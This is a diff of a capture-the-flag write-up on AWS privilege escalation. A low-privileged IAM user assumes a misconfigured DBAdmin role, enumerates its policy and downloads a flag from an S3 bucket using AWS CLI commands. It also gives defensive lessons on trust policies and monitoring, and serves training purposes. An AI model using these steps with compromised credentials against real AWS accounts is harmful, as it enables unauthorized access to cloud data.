@@ -1,199 +1,214 @@
-# AWS Red Team - IAM Role Assumption & S3 Flag Retrieval
+# AWS Red Team IAM Privilege Escalation - Assume Role
 
 ## Challenge Overview
 
-Welcome to Secure Corp, a leading organization with a growing cloud infrastructure.
+### Objective
 
-Recently, a security audit raised concerns about potential misconfigurations in IAM roles and permissions. As a Red Team Specialist, the objective is to investigate IAM permissions, identify vulnerabilities in role trust relationships, escalate privileges, and retrieve the hidden flag stored inside an S3 bucket.
+Identify and exploit an IAM privilege escalation path by abusing a misconfigured role trust relationship. The final goal is to assume a privileged IAM role and retrieve the hidden flag stored inside an S3 bucket.
+
+### Scenario
+
+An employee's AWS credentials have been compromised.
+
+The initial access belongs to a low-privileged IAM user. The objective is to investigate the available permissions, discover possible privilege escalation paths, assume a more privileged role, and access protected resources.
+
+The attack path is based on:
+
+* IAM role enumeration
+* STS AssumeRole abuse
+* IAM policy analysis
+* S3 resource access
+
+### Skills Practiced
+
+* AWS CLI authentication
+* IAM enumeration
+* AWS STS AssumeRole
+* Temporary credential handling
+* IAM policy analysis
+* S3 permission discovery
+
+---
+
+# Environment
 
 ## Initial Access
 
-The challenge provides AWS credentials of an employee IAM user.
-
-Available credentials:
+Provided credentials:
 
 * AWS Access Key ID
 * AWS Secret Access Key
 
-The objective is to:
+## Tools Used
 
-1. Configure AWS CLI.
-2. Investigate IAM permissions.
-3. Identify misconfigured IAM roles.
-4. Assume a privileged role.
-5. Access the protected S3 bucket.
-6. Retrieve the final flag.
-
-## AWS Resources
-
-The environment contains:
-
-* IAM Users
-* IAM Roles
-* IAM Policies
-* S3 Buckets
+* AWS CLI
+* Assume Role Enumeration Tool
 
 ---
 
-# Solution
+# Attack Workflow
 
-## Step 1 - Configure AWS CLI
-
-First, configure AWS CLI using the provided credentials.
-
-```bash
-aws configure --profile IAM01
-```
-
-Verify the current identity:
-
-```bash
-aws sts get-caller-identity --profile IAM01
-```
-
-Example output:
-
-```json
-{
-    "UserId": "AIDA...",
-    "Account": "058264439561",
-    "Arn": "arn:aws:iam::058264439561:user/Backend_Developer"
-}
-```
-
-This confirms that we are authenticated as an IAM user.
+The investigation started by configuring the AWS CLI with the provided credentials and identifying the current IAM identity.
 
 ---
 
-# Step 2 - Enumerate Possible IAM Roles
+## Step 1 - Configure AWS CLI Credentials
 
-The next objective is to discover roles that can be assumed by the current user.
+The first step was configuring AWS CLI using the provided employee credentials.
 
-## Method 1 - Using Assume Role Enumeration Tool
-
-A role enumeration tool can be used to identify assumable roles.
-
-Example:
+Command:
 
 ```bash
-python assume_role_enum.py --account-id ACCOUNT-ID --profile IAM01
+aws configure
 ```
 
-The tool attempts different role names and identifies roles where:
+To verify the current identity:
 
-```
-sts:AssumeRole
+```bash
+aws sts get-caller-identity
 ```
 
-is allowed.
+The returned identity was:
+
+```text
+arn:aws:iam::058264439561:user/Backend_Developer
+```
+
+At this point, the initial access was confirmed.
 
 ---
 
-## Method 2 - Manual Role Assumption
+## Step 2 - Test Initial Permissions
 
-If a possible role name is known, manually test it:
+Before searching for privilege escalation paths, several AWS services were tested to understand the current permission level.
+
+Examples:
 
 ```bash
-aws sts assume-role --role-arn arn:aws:iam::ACCOUNT-ID:role/ROLE-NAME --role-session-name test --profile IAM01
+aws s3 ls
+
+aws ec2 describe-instances
+
+aws lambda list-functions
+
+aws iam list-roles
 ```
 
-Successful execution returns temporary credentials:
+All attempts returned `AccessDenied`.
+
+This showed that the current IAM user had very limited permissions and direct access to AWS resources was not possible.
+
+The next assumption was that the intended path was through IAM role abuse.
+
+---
+
+# Step 3 - Enumerate Assumable IAM Roles
+
+The challenge description mentioned privilege escalation through IAM roles.
+
+An AssumeRole enumeration tool was used to identify roles that could be assumed by the current identity.
+
+The enumeration revealed a possible target role:
+
+```text
+DBAdmin
+```
+
+The role assumption was tested manually:
+
+```bash
+aws sts assume-role --role-arn arn:aws:iam::058264439561:role/DBAdmin --role-session-name test
+```
+
+The request succeeded and AWS returned temporary credentials:
 
 * AccessKeyId
 * SecretAccessKey
 * SessionToken
 
-Example:
-
-```
-arn:aws:sts::058264439561:assumed-role/DBAdmin/test
-```
-
-The current user has successfully assumed the DBAdmin role.
+This confirmed the privilege escalation path.
 
 ---
 
-# Step 3 - Configure Temporary Role Credentials
+# Step 4 - Configure Temporary Role Credentials
 
-The returned temporary credentials must be configured.
+The credentials returned from AssumeRole were temporary credentials and needed to be configured separately.
+
+A new AWS CLI profile was created:
 
 ```bash
-aws configure set aws_access_key_id TEMP_ACCESS_KEY --profile Role
+aws configure set aws_access_key_id <ACCESS_KEY> --profile Role
 
-aws configure set aws_secret_access_key TEMP_SECRET_KEY --profile Role
+aws configure set aws_secret_access_key <SECRET_KEY> --profile Role
 
-aws configure set aws_session_token TEMP_SESSION_TOKEN --profile Role
+aws configure set aws_session_token <SESSION_TOKEN> --profile Role
 ```
 
-Verify the assumed identity:
+The new identity was verified:
 
 ```bash
 aws sts get-caller-identity --profile Role
 ```
 
-Expected result:
+The identity changed from:
 
+```text
+Backend_Developer
 ```
-arn:aws:sts::ACCOUNT-ID:assumed-role/DBAdmin/test
+
+to:
+
+```text
+arn:aws:sts::058264439561:assumed-role/DBAdmin/test
 ```
+
+The role assumption was successful.
 
 ---
 
-# Step 4 - Enumerate Role Permissions
+# Step 5 - Analyze Role Permissions
 
-Now investigate the permissions attached to the assumed role.
+After obtaining the privileged role, the next step was identifying what permissions were attached to it.
 
-List attached policies:
+The attached policies were enumerated:
 
 ```bash
-aws iam list-attached-role-policies \
---role-name DBAdmin \
---profile Role
+aws iam list-attached-role-policies --role-name DBAdmin --profile Role
 ```
 
-The attached policy was identified:
+The result showed:
 
-```
+```text
 Manager_Access_S3
 ```
 
----
-
-Retrieve the policy content:
+The policy details were retrieved:
 
 ```bash
 aws iam get-policy-version \
---policy-arn arn:aws:iam::ACCOUNT-ID:policy/Manager_Access_S3 \
+--policy-arn arn:aws:iam::058264439561:policy/Manager_Access_S3 \
 --version-id v1 \
 --profile Role
 ```
 
-The policy revealed access to:
+The policy contained permissions:
 
-```json
-{
-    "Action": [
-        "s3:GetObject",
-        "s3:ListBucket"
-    ],
-    "Resource": [
-        "arn:aws:s3:::securecorpbakstoragebuk",
-        "arn:aws:s3:::securecorpbakstoragebuk/*"
-    ]
-}
+```text
+s3:GetObject
+s3:ListBucket
 ```
 
-This exposed the target S3 bucket:
+The target S3 bucket was identified:
 
-```
+```text
 securecorpbakstoragebuk
 ```
 
 ---
 
-# Step 5 - Access S3 Bucket
+# Step 6 - Retrieve Flag From S3
 
-List objects inside the bucket:
+The bucket contents were listed:
 
 ```bash
 aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role
@@ -201,11 +216,11 @@ aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role
 
 The flag file was discovered:
 
-```
+```text
 docs/Flag.txt
 ```
 
-Download the file:
+The object was downloaded:
 
 ```bash
 aws s3api get-object \
@@ -215,74 +230,110 @@ flag.txt \
 --profile Role
 ```
 
-The retrieved file contains the final flag.
+The downloaded file contained the final flag.
 
 ---
 
-# Attack Path Summary
+# Findings
 
-The attack chain:
+## Initial Identity
 
-```
-Employee Credentials
-        |
-        v
-AWS CLI Authentication
-        |
-        v
-Enumerate IAM Roles
-        |
-        v
-Find Misconfigured AssumeRole Permission
-        |
-        v
-Assume Privileged Role (DBAdmin)
-        |
-        v
-Enumerate Attached Policies
-        |
-        v
-Discover S3 Permissions
-        |
-        v
-Access Protected Bucket
-        |
-        v
-Retrieve Flag
+The compromised credentials belonged to:
+
+```text
+Backend_Developer
 ```
 
----
-
-# Key Security Lessons
-
-## IAM Role Trust Relationships
-
-Improperly configured role trust policies can allow unauthorized users to assume privileged roles.
-
-## Least Privilege
-
-Users should only have permissions required for their tasks.
-
-## Monitoring
-
-CloudTrail should monitor:
-
-* AssumeRole events
-* IAM policy changes
-* Unusual S3 access
-* Privilege escalation attempts
+This user had limited permissions and could not directly access AWS resources.
 
 ---
 
-# Challenge Recap
+## Privilege Escalation Path
 
-Successfully completed:
+The successful attack chain:
 
-* AWS CLI configuration with provided credentials
-* IAM role enumeration
-* Privileged role assumption
-* Permission enumeration
-* S3 bucket discovery
-* Flag retrieval
+```text
+Compromised IAM User
 
-The vulnerability was caused by an overly permissive IAM role trust relationship that allowed privilege escalation.
+        |
+        |
+        v
+
+AssumeRole Permission
+
+        |
+        |
+        v
+
+DBAdmin Role
+
+        |
+        |
+        v
+
+Manager_Access_S3 Policy
+
+        |
+        |
+        v
+
+S3 Bucket Access
+
+        |
+        |
+        v
+
+Flag Retrieval
+```
+
+---
+
+# Security Concepts Learned
+
+## IAM Users vs IAM Roles
+
+IAM users represent long-term identities, while roles provide temporary credentials.
+
+In this scenario, the user itself was not powerful, but it could obtain temporary credentials for a more privileged role.
+
+---
+
+## AssumeRole Abuse
+
+The ability to assume privileged roles can become a privilege escalation path if trust relationships are not properly configured.
+
+Attackers often search for:
+
+* Weak trust policies
+* Overly permissive roles
+* Misconfigured IAM relationships
+
+---
+
+## Temporary Credentials
+
+Assumed roles provide:
+
+* Access Key ID
+* Secret Access Key
+* Session Token
+
+These credentials are temporary and should be used instead of modifying the original identity.
+
+---
+
+# Key Takeaways
+
+* AccessDenied errors are useful for understanding the current privilege level.
+* A low-privileged IAM user can still become dangerous if it can assume privileged roles.
+* IAM roles should always have strict trust relationships.
+* Attached policies reveal the real capabilities of a role.
+* S3 access should follow the principle of least privilege.
+
+---
+
+# References
+
+* AWS IAM Documentation
+* AWS STS AssumeRole Documentation
+* AWS S3 Security Best Practices
